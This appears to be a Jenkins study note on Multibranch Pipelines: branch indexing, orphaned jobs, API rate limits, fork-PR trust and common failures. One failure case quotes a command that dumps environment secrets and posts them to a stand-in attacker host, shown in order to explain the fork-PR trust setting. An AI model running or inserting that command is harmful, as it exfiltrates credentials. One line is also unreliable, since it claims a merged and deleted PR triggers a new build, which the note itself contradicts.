# 🌳 Multibranch Pipelines

## 📌 Topic Name
Multibranch Pipelines and GitHub Organization Folders

## 🧠 Concept Explanation (Basic → Expert)
*   **Basic**: Jenkins automatically finds all your branches and Pull Requests and makes a job for each one.
*   **Expert**: The **Multibranch Pipeline (Branch Source Plugin)** is a paradigm shift in Jenkins from "Static Jobs" to "Dynamically Discovered Jobs." It leverages provider APIs (GitHub/GitLab API) to continuously scan repositories for branches/PRs containing a `Jenkinsfile`. When found, it automatically creates a sub-job. When a branch is deleted, the sub-job is marked as an "Orphaned Item" and deleted. A Staff engineer uses **GitHub Organization Folders** to scale this concept across hundreds of repositories, achieving true "Zero-Touch CI" provisioning.

## 🏗️ Mental Model
Think of standard Jenkins jobs as **Pets** and Multibranch as **Cattle**.
- **Standard Job (Pet)**: You manually click "New Item", name it, configure the Git URL, point it to `main`. If you create a `dev` branch, you have to clone the job manually.
- **Multibranch (Cattle)**: You point Jenkins at a Git Repository. Jenkins sends out a scout (Scanner). The scout reports: "Found `main`, `dev`, and `PR-42`." Jenkins automatically spins up 3 pipelines. When `PR-42` is merged and deleted, Jenkins executes the pipeline automatically.

## ⚡ Actual Behavior
- **Branch Indexing**: This is the process where Jenkins queries the Git API. It is fundamentally different from a build. Indexing consumes Controller HTTP threads and CPU to parse the repository tree looking for `Jenkinsfile`s.
- **Orphaned Items**: When a branch is deleted in Git, Jenkins doesn't immediately delete the job. The next time the branch indexer runs, it marks the job as orphaned and applies a retention policy (e.g., "Delete after 7 days").

## 🔬 Internal Mechanics (Jenkins core + OS + networking)
1.  **Branch Source Plugins**: Native Git plugin cannot do API scanning. You must use `github-branch-source` or `gitlab-branch-source`. These use the provider's REST/GraphQL APIs (not Git CLI) to list branches and PRs.
2.  **API Rate Limiting**: Scanning a GitHub organization with 500 repos and 5,000 branches will result in tens of thousands of API calls. Without proper caching and Webhook configurations, GitHub will issue a `403 Rate Limit Exceeded` and blacklist the Controller.
3.  **Trust Models**: For PRs originating from forks (Untrusted), Jenkins allows you to define strategies (e.g., "Only build if a collaborator comments 'retest'").

## 🔁 Execution Flow (New Pull Request)
1.  **Event**: Developer opens a Pull Request on GitHub.
2.  **Webhook**: GitHub sends a `pull_request` event payload to Jenkins.
3.  **Indexing**: Jenkins triggers a targeted Branch Index for that specific repo.
4.  **Discovery**: Jenkins sees a new PR containing a `Jenkinsfile`.
5.  **Job Creation**: Jenkins dynamically creates an in-memory job named `PR-42`.
6.  **Build**: Jenkins automatically triggers Build #1 for `PR-42`.
7.  **Status Sync**: Jenkins sends a REST call back to GitHub to set the Commit Status to "Success/Green Checkmark".

## 🧠 Resource Behavior (CPU, memory, IO, threads)
- **Folder Bloat**: A busy repo with 100 active PRs will create 100 sub-folders in `$JENKINS_HOME/jobs/`. This exacerbates the XML parsing overhead and inode consumption discussed in Core architecture.
- **Indexing Storms**: If Jenkins restarts, it may trigger a full rescan of all Multibranch projects, causing massive CPU spikes and API throttling.

## 📐 ASCII Diagrams (MANDATORY)
```text
[ GITHUB ORG FOLDER ] ---> (Scans API)
      |
      +--> [ REPO: frontend-ui ] (Multibranch Pipeline)
      |         |--> [ Branch: main ] ---> (Builds Jenkinsfile)
      |         |--> [ Branch: feat-1 ] -> (Builds Jenkinsfile)
      |         +--> [ PR: 42 ] ---------> (Builds Jenkinsfile)
      |
      +--> [ REPO: backend-api ] (Multibranch Pipeline)
                |--> [ Branch: main ] ---> (Builds Jenkinsfile)
                |--> [ Branch: hotfix ] -> (Builds Jenkinsfile)
```

## 🔍 Code (Jenkinsfile / Groovy / CLI / YAML)
```groovy
// Inside a Jenkinsfile, you often need to behave differently 
// depending on whether it's a PR or the main branch.
pipeline {
    agent any
    stages {
        stage('Build') {
            steps { sh 'make' }
        }
        stage('Deploy') {
            // BRANCH_NAME and CHANGE_ID are automatically injected 
            // by the Multibranch plugin.
            when { 
                branch 'main' 
            }
            steps {
                echo "Deploying to Production!"
            }
        }
    }
}
```

## 💥 Production Failures
1.  **The API Blacklist**: A misconfigured organization folder is set to "Scan periodically: 1 minute". Jenkins hammers the GitHub API. GitHub blacklists the corporate IP. Entire company loses CI/CD capabilities. **Solution**: Use Webhooks exclusively; set periodic scanning to 24 hours just as a fallback.
2.  **The PR Secrets Leak**: A malicious actor forks a public repo, modifies the `Jenkinsfile` to run `env > secrets.txt; curl -X POST -d @secrets.txt evil.com`, and opens a PR. Jenkins automatically builds the PR from the fork, executing the malicious code on your infrastructure and stealing AWS credentials. **Solution**: Set Trust strategy to "Require approval for fork PRs".
3.  **Storage Exhaustion**: 500 dead branches are deleted from Git, but Jenkins "Orphaned Item" strategy is set to "Keep Forever". Jenkins keeps gigabytes of logs and workspaces for dead branches forever.

## 🧪 Real-time Q&A
*   **Q**: How does Jenkins merge PR code?
*   **A**: By default, the GitHub Branch Source plugin checks out the *merge commit* of the PR. It takes the PR code, merges it into the target branch (e.g., `main`), and builds the result. This ensures the code will actually work after clicking merge in GitHub.
*   **Q**: Can I have a different Jenkinsfile name?
*   **A**: Yes, in the Multibranch configuration, you can specify a custom script path (e.g., `.ci/Jenkinsfile.prod`).

## ⚠️ Edge Cases
*   **Lightweight Checkout**: The Multibranch plugin attempts to read the `Jenkinsfile` directly via the GitHub API *before* cloning the repo. This is called Lightweight Checkout. If your Jenkinsfile is complex or requires local files, this can fail.

## 🏢 Best Practices
1.  **Zero-Touch CI**: Combine GitHub Organization Folders with JCasC. New repos automatically get CI pipelines with zero manual clicks in the Jenkins UI.
2.  **Aggressive Orphan Deletion**: Configure "Discard old items" to delete orphaned branches after 1 or 2 days max.
3.  **Cache GitHub API**: Run a local HTTP caching proxy (like Squid) if you have hundreds of Multibranch pipelines hitting rate limits.

## ⚖️ Trade-offs
*   **Automated Discovery vs Control**: Multibranch creates a chaotic Jenkins UI with thousands of dynamically appearing/disappearing jobs, but it eliminates 90% of the administrative toil associated with CI provisioning.

## 💼 Interview Q&A
*   **Q**: Developers are complaining that when they push to an existing Pull Request, the build doesn't trigger, but if they click "Scan Repository Now" in Jenkins, it works. What is broken?
*   **A**: The Webhook integration is broken. Jenkins is relying entirely on manual or periodic indexing to discover changes. I would check the GitHub repository's Webhook settings to ensure the payload is being successfully delivered to the Jenkins URL, check the Reverse Proxy for blocked traffic, and verify the Jenkins GitHub plugin configuration has the correct shared secret.

## 🧩 Practice Problems
1.  Create a Multibranch Pipeline pointing to a personal GitHub repo. Create a `dev` branch with a `Jenkinsfile`. Watch Jenkins automatically discover and build it.
2.  Delete the `dev` branch in GitHub. Observe the Jenkins UI and see how the job gets marked with a strike-through (Orphaned).

---
Prev: [02_Webhooks_vs_Polling.md](../SCM/02_Webhooks_vs_Polling.md) | Index: [Docker/00_Index.md](../00_Index.md) | Next: [04_Large_Repo_Challenges.md](../SCM/04_Large_Repo_Challenges.md)
---
